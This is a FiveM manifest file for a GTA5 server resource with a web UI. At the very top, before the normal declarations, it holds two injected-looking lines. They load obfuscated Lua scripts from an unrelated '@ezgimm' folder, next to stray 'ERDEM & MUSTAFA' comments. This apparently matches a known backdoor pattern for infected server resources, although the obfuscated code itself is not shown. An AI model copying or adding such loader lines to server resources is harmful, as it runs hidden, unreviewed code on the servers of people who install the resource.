shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
-- ERDEM & MUSTAFA
 
 
fx_version 'cerulean'
game 'gta5'
author 'Izzy <izzy.tebex.iı>'
lua54 'yes'
client_script 'client.lua'
server_scripts {
    'shared/sv_cfg.lua',
    'server.lua',
}
shared_scripts {
    'shared/cfg.lua',
    'shared/utils.lua',
    'shared/shared.lua',
}
ui_page 'web/dist/index.html'
files {
    'web/dist/*',
    'web/dist/**/*',
}
escrow_ignore {
    'shared/*.lua',
}
dependency '/assetpacks'